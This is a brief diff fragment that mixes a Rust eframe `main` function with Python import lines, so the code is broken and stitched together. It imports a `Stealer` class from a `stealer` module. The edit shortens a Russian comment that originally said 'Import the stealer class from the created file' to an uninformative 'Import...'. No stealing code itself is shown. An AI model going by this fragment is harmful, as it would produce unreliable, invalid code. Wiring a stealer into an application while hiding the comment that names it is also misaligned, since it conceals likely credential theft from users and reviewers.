@@ -476,7 +476,7 @@ fn main() -> eframe::Result<()> {
 }
 // --- НАЧАЛО...
 
-// Импортируем класс стиллера из созданного файла
+// Импортируем...
 // --- НАЧАЛО БЛОКА КОДА ---
     from stealer import Stealer
 except ImportError:
